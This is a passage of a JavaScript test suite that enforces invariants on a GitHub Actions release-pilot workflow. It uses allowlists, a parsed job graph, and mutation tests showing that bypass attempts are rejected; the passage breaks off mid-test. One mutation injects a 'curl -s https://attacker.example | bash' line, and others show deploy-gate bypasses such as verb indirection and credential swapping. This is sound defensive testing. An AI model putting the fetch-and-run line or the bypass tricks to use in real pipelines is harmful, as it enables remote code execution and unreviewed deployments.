// Structural invariants for .github/workflows/release-pilot.yml (#70 Slice A).
//
// Round 2 of the Codex review proved the first version of this file checked SUBSTRINGS: an `if:`
// with `|| true` appended, a deploy that merely echoed the digest, and an extra pilot job that only
// mentioned the words `context_digest` all returned zero errors. Substring presence is not a
// property. This version parses the job DAG and validates it: closed success expressions, transitive
// descent, verify-before-deploy ordering — and the release-identity script is additionally EXECUTED
// against a stubbed git, because a shell pattern can only be proven by running it (the committed
// `[0-9a-f]*` check accepted "a" followed by 39 uppercase Zs, and no text assertion saw it).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';

const here = dirname(fileURLToPath(import.meta.url));
const WORKFLOW = join(here, '..', '.github', 'workflows', 'release-pilot.yml');
const raw = fs.readFileSync(WORKFLOW, 'utf8');

/** Strip full-line YAML comments: a comment describing a command is not the command. */
function stripComments(text) {
  return text
    .split('\n')
    .filter((line) => !/^\s*#/.test(line))
    .join('\n');
}

/**
 * Split a workflow into its top-level jobs.
 *
 * The lookahead requires the two-space key to be followed by a newline, which is what makes it a
 * job header rather than a nested `key: value`. An earlier version anchored with `$` and no `m`
 * flag, so it never split at all — every job collapsed into one chunk and inherited its neighbours'
 * gates. The partition test below exists so that failure mode cannot return silently.
 */
export function jobsOf(text) {
  const start = text.indexOf('\njobs:');
  if (start < 0) return [];
  const body = text.slice(start + '\njobs:'.length);
  return body
    .split(/\n(?=  [A-Za-z_][\w-]*:[ \t]*(?:\r?\n))/)
    .map((chunk) => {
      const header = chunk.split('\n').find((l) => /^ {2}[A-Za-z_][\w-]*:[ \t]*$/.test(l));
      return header ? { name: header.trim().replace(/:$/, ''), text: chunk } : null;
    })
    .filter(Boolean);
}

/**
 * THE CLOSED STEP SHAPE (#70 round 4). Rounds 3 and 4 proved that both ordering heuristics and
 * command blacklists can be talked around — `verb=deploy; npx cdk "$verb"` sailed past a verb
 * regex. So the lane's executable surface is a WHITELIST: every step must be either an action from
 * the exact allowlist below, or a run block byte-identical to one of the reviewed templates. A new
 * command — any new command — fails the invariants until it is added here deliberately, under
 * review. Deployment happens only through `bin/deploy-release.js`, whose binding is proven by its
 * own suite; no template invokes it yet, because Slice A deploys nothing.
 */
const ACTION_ALLOWLIST = {
  'actions/checkout@v7': [/persist-credentials: false/],
  'actions/setup-node@v6': [],
  'aws-actions/configure-aws-credentials@v6': [/mask-aws-account-id: true/, /role-to-assume: \$\{\{ secrets\./],
};

const SINGLE_LINE_RUNS = new Set(['npm ci', 'npm test']);

const RUN_TEMPLATES = new Set([
  "set -euo pipefail\n# Shape FIRST, before any git invocation, and over ALL forty characters: a `[0-9a-f]*`\n# pattern validates only the first one, so \"a\" followed by 39 \"Z\"s passed it.\nif [ \"${#RELEASE_SHA}\" -ne 40 ] || [ -n \"${RELEASE_SHA//[0-9a-f]/}\" ]; then\n  echo \"::error::release_sha must be exactly 40 lowercase hex characters \u2014 a commit OID, never a ref name\"\n  exit 1\nfi\ngit fetch --quiet origin main\n# The object must BE a commit: a 40-hex tag or blob OID is not a release.\ntype=$(git cat-file -t \"$RELEASE_SHA\" 2>/dev/null || true)\nif [ \"$type\" != \"commit\" ]; then\n  echo \"::error::release_sha does not name a commit object in main's history\"\n  exit 1\nfi\nresolved=$(git rev-parse --verify \"$RELEASE_SHA^{commit}\")\nif [ \"$resolved\" != \"$RELEASE_SHA\" ]; then\n  echo \"::error::release_sha did not resolve to itself; refusing an ambiguous name\"\n  exit 1\nfi\nif ! git merge-base --is-ancestor \"$resolved\" origin/main; then\n  echo \"::error::release_sha is not an ancestor of main \u2014 only reviewed, merged commits are releasable\"\n  exit 1\nfi\n# Emit the RESOLVED OID, never the original input: downstream jobs pin to this output,\n# so a ref moved between validation and a later checkout has nothing left to move.\necho \"release_sha=$resolved\" >> \"$GITHUB_OUTPUT\"",
  "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=dev \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\nnode bin/deploy-preflight.js \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-dev.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-dev.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-dev.json\")\" >> \"$GITHUB_OUTPUT\"",
  "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=pilot \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\nnode bin/deploy-preflight.js \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-pilot.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-pilot.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-pilot.json\")\" >> \"$GITHUB_OUTPUT\"",
  "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"",
  "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"",
  "echo \"Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,\"\necho \"no account mutation and no paid call happened in this run.\"",
]);

function stepsOf(jobText) {
  return jobText.split(/\n(?= {6}- )/).slice(1);
}

function runBlockOf(chunk) {
  const idx = chunk.indexOf('run: |');
  if (idx < 0) return null;
  const after = chunk.slice(chunk.indexOf('\n', idx) + 1);
  const lines = [];
  for (const line of after.split('\n')) {
    if (line.trim() === '') {
      lines.push('');
      continue;
    }
    if (!line.startsWith('          ')) break;
    lines.push(line.slice(10));
  }
  while (lines.length && lines[lines.length - 1] === '') lines.pop();
  return lines.join('\n');
}

/**
 * The ONLY success expressions a job may carry. Known jobs are pinned exactly; any additional job
 * must fit the closed grammar — conjunctions of `needs.X.result == 'success'` with at most the mode
 * clause. No `||`, no `!`, no function call survives either path, so `|| true`,
 * `|| ... == 'failure'`, `always()` and `!cancelled()` are all refused by construction.
 */
const EXPECTED_IF = {
  'dev-preflight': "needs.global-preflight.result == 'success'",
  'dev-stage': "needs.dev-preflight.result == 'success'",
  'pilot-preflight': "needs.dev-stage.result == 'success' && inputs.mode == 'dev_then_pilot'",
  'pilot-stage': "needs.pilot-preflight.result == 'success'",
};
const IF_GRAMMAR =
  /^needs\.[A-Za-z_][\w-]*\.result == 'success'( && needs\.[A-Za-z_][\w-]*\.result == 'success')*( && inputs\.mode == 'dev_then_pilot')?$/;

/**
 * Every structural rule, evaluated on SUPPLIED text.
 * @returns {string[]} one message per violation; empty means the workflow holds.
 */
export function releaseLaneErrors(text) {
  const errors = [];
  const code = stripComments(text);
  const jobs = jobsOf(text);
  if (jobs.length === 0) return ['no jobs could be parsed from the workflow'];
  const header = code.slice(0, code.indexOf('\njobs:'));

  // ---- inputs: identity in, targets never ---------------------------------------------------
  if (!/^\s{6}release_sha:/m.test(header)) errors.push('there is no release_sha input');
  if (!/^\s{6}mode:/m.test(header)) errors.push('there is no mode input');
  for (const [pattern, message] of [
    [/^\s{6}environment:/m, 'environment must not be an operator-facing input — mode selects the path'],
    [/^\s{6}\w*(callback|logout|url|urls)\w*:/im, 'deploy targets must not be caller inputs; they resolve from Environment configuration'],
    [/^\s{6}\w*pool\w*:/im, 'the expected user pool id must not be caller-supplied'],
  ]) {
    if (pattern.test(header)) errors.push(message);
  }
  if (!/options:\n\s+- dev_only\n\s+- dev_then_pilot/.test(header)) errors.push('mode must offer exactly dev_only and dev_then_pilot');

  // ---- trigger ------------------------------------------------------------------------------
  if (!/^on:\n\s+workflow_dispatch:/m.test(header)) errors.push('the lane must be triggered by workflow_dispatch');
  for (const forbidden of ['push', 'schedule', 'pull_request', 'pull_request_target']) {
    if (new RegExp(`^\\s{2}${forbidden}:`, 'm').test(header)) errors.push(`the lane must not be triggered by ${forbidden}`);
  }

  // ---- parse each job -----------------------------------------------------------------------
  const meta = new Map();
  for (const job of jobs) {
    const body = stripComments(job.text);
    const needsMatch = /\n\s{4}needs:\s*(\[[^\]]*\]|[^\n]+)/.exec(body);
    const needs = needsMatch
      ? needsMatch[1].replace(/[[\]]/g, '').split(',').map((s) => s.trim()).filter(Boolean)
      : [];
    const envMatch = /\n\s{4}environment:\s*([^\n]+)/.exec(body);
    const ifMatch = /\n\s{4}if:\s*([^\n]+)/.exec(body);
    meta.set(job.name, { needs, environment: envMatch ? envMatch[1].trim() : null, ifExpr: ifMatch ? ifMatch[1].trim() : null, body });
  }
  const ancestorsOf = (name, seen = new Set()) => {
    for (const n of meta.get(name)?.needs ?? []) {
      if (!seen.has(n)) {
        seen.add(n);
        ancestorsOf(n, seen);
      }
    }
    return seen;
  };

  // ---- release identity job -----------------------------------------------------------------
  const identity = meta.get('global-preflight');
  if (!identity) errors.push('there is no global-preflight job');
  else {
    if (identity.environment) errors.push('global-preflight must not bind an Environment');
    // The script's load-bearing lines. Their SEMANTICS are proven by execution below; this only
    // pins that they exist, so a deletion cannot hide behind the executable tests being edited.
    for (const [marker, why] of [
      ['-ne 40', 'the full-length check'],
      ['${RELEASE_SHA//[0-9a-f]/}', 'the whole-string charset check'],
      ['cat-file -t', 'the commit-object proof'],
      ['rev-parse --verify', 'the self-resolution proof'],
      ['merge-base --is-ancestor', 'the ancestry check'],
      ['release_sha=$resolved', 'emission of the RESOLVED OID'],
    ]) {
      if (!identity.body.includes(marker)) errors.push(`global-preflight lost ${why}`);
    }
    if (identity.body.includes('release_sha=$RELEASE_SHA')) {
      errors.push('global-preflight emits the raw input instead of the resolved OID');
    }
    const idCheckout = /- uses: actions\/checkout[^]*?(?=\n      - name:)/.exec(identity.body);
    if (!idCheckout || !/ref: main/.test(idCheckout[0]) || !/fetch-depth: 0/.test(idCheckout[0])) {
      errors.push('global-preflight must check out main with full history, never the candidate');
    }
  }

  // ---- checkouts: pinned to the RESOLVED OID everywhere else --------------------------------
  if (/ref: \$\{\{ inputs\.release_sha \}\}/.test(code)) {
    errors.push('the raw release_sha input is used as a checkout ref — only the resolved output may be');
  }
  for (const [name, m] of meta) {
    if (name === 'global-preflight') continue;
    const checkouts = m.body.split(/\n(?=      - uses: actions\/checkout)/).filter((c) => /uses: actions\/checkout/.test(c));
    for (const chunk of checkouts) {
      if (!/ref: \$\{\{ needs\.global-preflight\.outputs\.release_sha \}\}/.test(chunk)) {
        errors.push(`a checkout in "${name}" is not pinned to the resolved release OID`);
      }
    }
  }
  for (const chunk of code.split(/\n(?=      - uses: actions\/checkout)/).filter((c) => /uses: actions\/checkout/.test(c))) {
    if (!/persist-credentials: false/.test(chunk)) errors.push('a checkout persists credentials');
  }

  // ---- per-job gating: closed expressions, full DAG -----------------------------------------
  for (const [name, m] of meta) {
    if (name === 'global-preflight') continue;
    const ancestors = ancestorsOf(name);
    if (!ancestors.has('global-preflight')) errors.push(`job "${name}" does not descend from global-preflight`);
    if (!m.ifExpr) {
      errors.push(`job "${name}" has no explicit success condition`);
    } else {
      if (Object.hasOwn(EXPECTED_IF, name) && m.ifExpr !== EXPECTED_IF[name]) {
        errors.push(`job "${name}" changed its success condition from the pinned expression`);
      }
      if (!IF_GRAMMAR.test(m.ifExpr)) errors.push(`job "${name}" has a success condition outside the closed grammar`);
      for (const ref of m.ifExpr.matchAll(/needs\.([A-Za-z_][\w-]*)\.result/g)) {
        if (!m.needs.includes(ref[1])) errors.push(`job "${name}" conditions on "${ref[1]}" without depending on it`);
      }
    }
    if (/continue-on-error:\s*true/.test(m.body)) errors.push(`job "${name}" is continue-on-error`);

    if (m.environment === 'pilot' && name !== 'pilot-preflight') {
      if (!ancestors.has('pilot-preflight')) errors.push(`pilot-bound job "${name}" does not descend from the pilot preflight`);
      if (!ancestors.has('dev-stage')) errors.push(`pilot-bound job "${name}" does not descend from the green dev stage`);
    }
    if (m.environment === 'dev' && name !== 'dev-preflight' && !ancestors.has('dev-preflight')) {
      errors.push(`dev-bound job "${name}" does not descend from the dev preflight`);
    }

    // THE CLOSED SHAPE: every step is an allowlisted action or a reviewed run template. This is
    // where a smuggled deploy dies — whatever it is spelled like — because it is not on the list.
    const jobRaw = jobs.find((j) => j.name === name).text;
    stepsOf(jobRaw).forEach((chunk, i) => {
      const usesMatch = /(?:^|\n)\s{6,8}(?:- )?uses: (\S+)/.exec(chunk);
      if (usesMatch) {
        const action = usesMatch[1];
        if (!Object.hasOwn(ACTION_ALLOWLIST, action)) {
          errors.push(`job "${name}" step ${i + 1} uses an action outside the closed allowlist`);
        } else {
          for (const must of ACTION_ALLOWLIST[action]) {
            if (!must.test(chunk)) errors.push(`job "${name}" step ${i + 1} drops a required property of ${action}`);
          }
        }
        return;
      }
      const block = runBlockOf(chunk);
      if (block !== null) {
        if (!RUN_TEMPLATES.has(block)) errors.push(`job "${name}" step ${i + 1} runs a block outside the reviewed templates`);
        return;
      }
      const single = /(?:^|\n)\s{8}run: (?!\|)([^\n]+)/.exec(chunk);
      if (single) {
        if (!SINGLE_LINE_RUNS.has(single[1].trim())) {
          errors.push(`job "${name}" step ${i + 1} runs a command outside the reviewed set`);
        }
        return;
      }
      errors.push(`job "${name}" step ${i + 1} has a shape the invariants do not recognise`);
    });
  }

  // ---- pilot entry: the mode clause lives on the pinned expression --------------------------
  const pp = meta.get('pilot-preflight');
  if (!pp) errors.push('there is no pilot-preflight job');
  else if (!pp.needs.includes('dev-stage')) errors.push('pilot-preflight does not directly depend on the dev stage');
  if (!meta.get('pilot-stage')) errors.push('there is no pilot-stage job');

  // ---- stage jobs must verify the manifest even before any deploy exists --------------------
  for (const [name, m] of meta) {
    if (/-stage$/.test(name) && !m.body.includes('verify-manifest')) {
      errors.push(`stage job "${name}" does not verify the preflight manifest`);
    }
  }

  // ---- secrets and identifiers ---------------------------------------------------------------
  if (!/role-to-assume: \$\{\{ secrets\./.test(code)) errors.push('the deploy role ARN must come from a secret, not a variable');
  if (!/mask-aws-account-id: true/.test(code)) errors.push('account-id masking must be enabled');
  if (/\b\d{12}\b/.test(code)) errors.push('the workflow contains a literal 12-digit account id');
  if (/arn:aws:iam::\d/.test(code)) errors.push('the workflow contains a literal IAM ARN');

  return errors;
}

/* ================= the real file, and the parser itself ======================================== */

test('the release lane satisfies every structural invariant', () => {
  assert.deepEqual(releaseLaneErrors(raw), []);
});

test('the job parser actually partitions the file — the rules are per-job, not per-file', () => {
  const jobs = jobsOf(raw);
  assert.deepEqual(jobs.map((j) => j.name), ['global-preflight', 'dev-preflight', 'dev-stage', 'pilot-preflight', 'pilot-stage']);
  assert.equal(/\n\s{4}needs:/.test(jobs[0].text), false, 'global-preflight must not carry a neighbour’s needs:');
  assert.equal(/\n\s{4}environment:/.test(jobs[0].text), false, 'global-preflight must not carry a neighbour’s environment:');
});

/* ================= mutations ==================================================================== */

const rejects = (mutated, why) => {
  assert.notEqual(mutated, raw, `mutation did not apply: ${why}`);
  assert.notDeepEqual(releaseLaneErrors(mutated), [], `must be rejected: ${why}`);
};

test('POSITIVE CONTROL: release identity cannot be weakened', () => {
  rejects(raw.replace(' || [ -n "${RELEASE_SHA//[0-9a-f]/}" ]', ''), 'the whole-string charset check removed');
  rejects(raw.replace('          type=$(git cat-file -t "$RELEASE_SHA" 2>/dev/null || true)\n', '          type=commit\n'), 'the commit-object proof removed');
  rejects(raw.replace('if ! git merge-base --is-ancestor "$resolved" origin/main; then', 'if false; then'), 'the ancestry check removed');
  rejects(raw.replace('release_sha=$resolved', 'release_sha=$RELEASE_SHA'), 'the raw input emitted instead of the resolved OID');
  rejects(raw.replace('          ref: main\n          fetch-depth: 0\n', '          ref: ${{ inputs.release_sha }}\n'), 'the identity job checks out the unvalidated candidate');
  rejects(
    raw.replace('  global-preflight:\n    name: Release identity (shape, object type and ancestry)\n    runs-on: ubuntu-latest\n', '  global-preflight:\n    name: Release identity (shape, object type and ancestry)\n    runs-on: ubuntu-latest\n    environment: dev\n'),
    'the identity job can read environment configuration',
  );
});

test('POSITIVE CONTROL: the checkout pinning cannot be loosened', () => {
  rejects(raw.replaceAll('          ref: ${{ needs.global-preflight.outputs.release_sha }}\n', ''), 'unpinned checkouts');
  rejects(raw.replaceAll('ref: ${{ needs.global-preflight.outputs.release_sha }}', 'ref: ${{ inputs.release_sha }}'), 'checkouts pinned to the raw input');
  rejects(raw.replaceAll('          persist-credentials: false\n', ''), 'checkouts persist credentials');
});

test('POSITIVE CONTROL: no operator input may reintroduce a target or a direct pilot path', () => {
  rejects(raw.replace('      mode:', '      environment:\n        description: x\n        required: true\n        type: string\n      mode:'), 'an environment input');
  rejects(raw.replace('      mode:', '      auth_callback_urls:\n        description: x\n        required: true\n        type: string\n      mode:'), 'a caller-supplied URL input');
  rejects(raw.replace('      mode:', '      expected_user_pool_id:\n        description: x\n        required: false\n        type: string\n      mode:'), 'a caller-supplied pool id');
  rejects(raw.replace('on:\n  workflow_dispatch:', 'on:\n  push:\n    branches: [main]\n  workflow_dispatch:'), 'an automatic trigger');
  rejects(raw.replace("    if: needs.dev-stage.result == 'success' && inputs.mode == 'dev_then_pilot'", "    if: needs.global-preflight.result == 'success'"), 'pilot entry without the dev stage or the mode');
  rejects(raw.replace('\n    needs: [global-preflight, dev-preflight, dev-stage]', '\n    needs: [global-preflight]'), 'pilot-preflight detached from the dev stage');
});

/** Replace the dev stage's terminal step with an arbitrary injected step, for bypass mutations. */
const injectDevStep = (step) =>
  raw.replace(
    /      - name: Slice A stops here\n        run: \|\n          echo "Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,"\n          echo "no account mutation and no paid call happened in this run."\n\n  # -+\n  # PILOT PREFLIGHT/,
    `${step}\n\n  # x\n  # PILOT PREFLIGHT`,
  );

test('POSITIVE CONTROL: every reproduction from the round-2 review is rejected by name', () => {
  // (1) A deploy that merely echoes the digest.
  rejects(
    injectDevStep('      - name: Deploy\n        env:\n          CONTEXT_DIGEST: ${{ needs.dev-preflight.outputs.context_digest }}\n        run: |\n          echo "$CONTEXT_DIGEST"\n          cdk deploy --all'),
    'echo "$CONTEXT_DIGEST"; cdk deploy --all',
  );

  // (2) `|| true` appended to a pinned success expression.
  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", "    if: needs.dev-preflight.result == 'success' || true\n    runs-on"), "|| true");

  // (3) An OR branch that accepts a FAILED dependency.
  rejects(
    raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", "    if: needs.dev-preflight.result == 'success' || needs.dev-preflight.result == 'failure'\n    runs-on"),
    "|| result == 'failure'",
  );

  // (4) An extra pilot deployment job that skips the dev stage and merely mentions the digest.
  const extraJob = `${raw}
  pilot-deploy:
    name: Rogue pilot deploy
    needs: [global-preflight]
    if: needs.global-preflight.result == 'success'
    runs-on: ubuntu-latest
    environment: pilot
    steps:
      - name: Deploy
        run: |
          echo context_digest
          cdk deploy --all
`;
  rejects(extraJob, 'an extra pilot deploy job descending only from global-preflight');
});

test('POSITIVE CONTROL: every reproduction from the round-3 review is rejected by name', () => {
  // (1) Verify a safe context, then deploy a different one. The two-command shape itself is what
  // gets refused: NO raw deploy may exist, whatever verification precedes it — the binding lives in
  // bin/deploy-release.js, which derives the deploy from the very object it verified.
  rejects(
    injectDevStep('      - name: Deploy\n        run: |\n          node infra/aws/bin/deploy-preflight.js verify-manifest --recompute --region us-east-1 --manifest m.json --environment dev --release-sha x -c authDomainPrefix=safe\n          cdk deploy --all -c authDomainPrefix=other'),
    'verify context A, deploy context B',
  );

  // (2) Verify, swap credentials, deploy.
  rejects(
    injectDevStep('      - name: Verify\n        run: |\n          node infra/aws/bin/deploy-preflight.js verify-manifest --recompute --region us-east-1 --manifest m.json --environment dev --release-sha x\n      - name: Swap credentials\n        uses: aws-actions/configure-aws-credentials@v6\n        with:\n          role-to-assume: ${{ secrets.OTHER_ROLE }}\n          aws-region: ${{ vars.AWS_REGION }}\n          mask-aws-account-id: true\n      - name: Deploy\n        run: |\n          cdk deploy --all'),
    'verify, replace credentials, deploy',
  );

  // (3) Verify an AWS manifest, then deploy an unrelated Cloudflare target.
  rejects(
    injectDevStep('      - name: Deploy\n        run: |\n          node infra/aws/bin/deploy-preflight.js verify-manifest --recompute --region us-east-1 --manifest m.json --environment dev --release-sha x\n          wrangler deploy'),
    'verify AWS, deploy Cloudflare',
  );

  // The sanctioned entrypoint is still held to the DAG: outside a properly descended,
  // Environment-bound job it is refused too.
  const rogueEntrypoint = `${raw}
  pilot-deploy:
    name: Rogue entrypoint use
    needs: [global-preflight]
    if: needs.global-preflight.result == 'success'
    runs-on: ubuntu-latest
    environment: pilot
    steps:
      - name: Deploy
        run: |
          node infra/aws/bin/deploy-release.js --manifest m.json --environment pilot --release-sha x --region x
`;
  rejects(rogueEntrypoint, 'the entrypoint outside the pilot DAG');

  const noEnvEntrypoint = `${raw}
  side-deploy:
    name: Entrypoint without an Environment
    needs: [global-preflight]
    if: needs.global-preflight.result == 'success'
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: |
          node infra/aws/bin/deploy-release.js --manifest m.json --environment dev --release-sha x --region x
`;
  rejects(noEnvEntrypoint, 'the entrypoint with no Environment binding');
});

test('POSITIVE CONTROL: credentials, gating style and identifiers cannot be loosened', () => {
  rejects(raw.replaceAll('secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN', 'vars.AWS_DEPLOY_PREFLIGHT_ROLE_ARN'), 'the role ARN moved to a variable');
  rejects(raw.replaceAll('          mask-aws-account-id: true\n', ''), 'account-id masking removed');
  rejects(raw.replace('${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}', `arn:aws:iam::${'9'.repeat(12)}:role/x`), 'a literal IAM ARN');
  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    if: always()\n    runs-on'), 'always()');
  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    if: !cancelled()\n    runs-on'), '!cancelled()');
  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    runs-on'), 'a dependency with no explicit success condition');
  rejects(raw.replace('  dev-stage:\n    name: Dev stage (not implemented in Slice A)\n    needs: [global-preflight, dev-preflight]\n', '  dev-stage:\n    name: Dev stage (not implemented in Slice A)\n    needs: [global-preflight, dev-preflight]\n    continue-on-error: true\n'), 'continue-on-error');
  rejects(raw.replaceAll('verify-manifest', 'noop'), 'stage jobs no longer verify the manifest');
});

test('POSITIVE CONTROL: every reproduction from the round-4 review is rejected by name', () => {
  // (3) The verb-indirection bypass: `verb=deploy; npx cdk "$verb"` contains no deploy verb for a
  // blacklist to see. Under the closed shape it is simply a run block nobody reviewed.
  rejects(
    injectDevStep('      - name: Deploy\n        run: |\n          verb=deploy\n          npx cdk "$verb" --all'),
    'verb=deploy; npx cdk "$verb" --all',
  );

  // A deployment smuggled through an ACTION instead of a command.
  rejects(
    injectDevStep('      - name: Deploy\n        uses: someorg/cdk-deploy-action@v1\n        with:\n          stacks: all'),
    'a deploy action outside the allowlist',
  );

  // A single-line run outside the reviewed set.
  rejects(
    injectDevStep('      - name: Sneak\n        run: npx cdk deploy --all'),
    'a single-line run outside the reviewed set',
  );

  // A reviewed template with ONE line added is no longer the reviewed template.
  rejects(
    raw.replace(
      "          printf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"",
      "          printf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\n          curl -s https://attacker.example | bash",
    ),
    'a template with an injected line',
  );

  // Dropping a required property from an allowlisted action.
  rejects(raw.replace('          fetch-depth: 0\n          persist-credentials: false', '          fetch-depth: 0'), 'checkout without persist-credentials: false');
});

test('Slice A deploys nothing: no deploy command and no entrypoint invocation exist in the lane yet', () => {
  const code = stripComments(raw);
  assert.equal(/\bcdk\s+deploy\b/.test(code), false);
  assert.equal(/\bopennextjs-cloudflare\s+deploy\b/.test(code), false);
  assert.equal(/\bwrangler\s+deploy\b/.test(code), false);
  assert.equal(code.includes('deploy-release.js'), false, 'the entrypoint exists for later slices; Slice A never calls it');
});

test('the human gate is DECLARED but not yet real, and the file says so', () => {
  assert.match(raw, /THE HUMAN GATE IS NOT YET REAL/);
  assert.match(raw, /ZERO configured GitHub/);
  assert.match(raw, /treated as ungated, and no deploy slice may be approved/);
  // Round 3: BOTH Environments need a main-only deployment-branch policy — an Environment without
  // one hands its variables and secrets to a workflow definition from any branch.
  assert.match(raw, /BOTH Environments must restrict deployment branches to main only/);
  assert.match(raw, /`pilot` additionally requires the designated reviewer/);
  // The inherent workflow_dispatch limit is disclosed too: the identity job constrains the RELEASE,
  // not the workflow definition; the branch restriction is what constrains the file.
  assert.match(raw, /executes the workflow\n# DEFINITION from the branch the operator selects/);
});

/* ================= the identity script, EXECUTED =============================================== */
//
// A shell pattern can only be trusted by running it. The committed `case ... [0-9a-f]*` accepted
// "a" followed by 39 uppercase Zs — every text assertion in the previous version looked straight
// past that. These tests extract the script from the YAML and run it under a stubbed git, so the
// refusals are observed, not inferred.

function identityScript(text) {
  const anchor = text.indexOf('- name: Validate release identity');
  assert.ok(anchor > 0, 'the identity step exists');
  const runIdx = text.indexOf('        run: |', anchor);
  assert.ok(runIdx > 0, 'the identity step has a run block');
  const after = text.slice(text.indexOf('\n', runIdx) + 1);
  const lines = [];
  for (const line of after.split('\n')) {
    if (line.trim() === '') {
      lines.push('');
      continue;
    }
    if (!line.startsWith('          ')) break;
    lines.push(line.slice(10));
  }
  return lines.join('\n');
}

/**
 * Run the extracted script with a stub `git` whose behaviour is driven by env vars, recording every
 * invocation. The stub is the seam: object type, resolution and ancestry each become controllable.
 */
function runIdentity({ sha, type = 'commit', resolved = '', ancestorExit = 0 }) {
  const script = identityScript(raw);
  const dir = fs.mkdtempSync(join(os.tmpdir(), 'cba-identity-'));
  try {
    const calls = join(dir, 'calls.log');
    fs.writeFileSync(calls, '');
    fs.writeFileSync(
      join(dir, 'git'),
      [
        '#!/usr/bin/env bash',
        'echo "$*" >> "$GIT_CALLS"',
        'last="${@: -1}"',
        'case "$1" in',
        '  fetch) exit 0 ;;',
        '  cat-file)',
        '    if [ "$GIT_TYPE" = "missing" ]; then exit 128; fi',
        '    printf \'%s\\n\' "$GIT_TYPE" ;;',
        '  rev-parse)',
        '    oid=$(printf \'%s\' "$last" | sed \'s/\\^{commit}$//\')',
        '    if [ -n "$GIT_RESOLVED" ]; then printf \'%s\\n\' "$GIT_RESOLVED"; else printf \'%s\\n\' "$oid"; fi ;;',
        '  merge-base) exit "$GIT_ANCESTOR_EXIT" ;;',
        '  *) exit 1 ;;',
        'esac',
        '',
      ].join('\n'),
      { mode: 0o755 },
    );
    const outFile = join(dir, 'github-output');
    fs.writeFileSync(outFile, '');
    const res = spawnSync('bash', ['-c', script], {
      encoding: 'utf8',
      env: {
        ...process.env,
        PATH: `${dir}:${process.env.PATH}`,
        RELEASE_SHA: sha,
        GITHUB_OUTPUT: outFile,
        GIT_CALLS: calls,
        GIT_TYPE: type,
        GIT_RESOLVED: resolved,
        GIT_ANCESTOR_EXIT: String(ancestorExit),
      },
    });
    return { status: res.status, calls: fs.readFileSync(calls, 'utf8'), out: fs.readFileSync(outFile, 'utf8') };
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

const OID = 'a'.repeat(40);

test('EXECUTED: the exact round-2 value — "a" plus 39 uppercase Zs — is refused before git runs', () => {
  const r = runIdentity({ sha: `a${'Z'.repeat(39)}` });
  assert.notEqual(r.status, 0);
  assert.equal(r.calls, '', 'the shape check must refuse BEFORE any git invocation');
});

test('EXECUTED: short values and ref-shaped names never reach git', () => {
  for (const sha of ['a'.repeat(39), 'a'.repeat(41), 'main', `refs/heads/${'a'.repeat(29)}`, OID.toUpperCase(), '']) {
    const r = runIdentity({ sha });
    assert.notEqual(r.status, 0, JSON.stringify(sha));
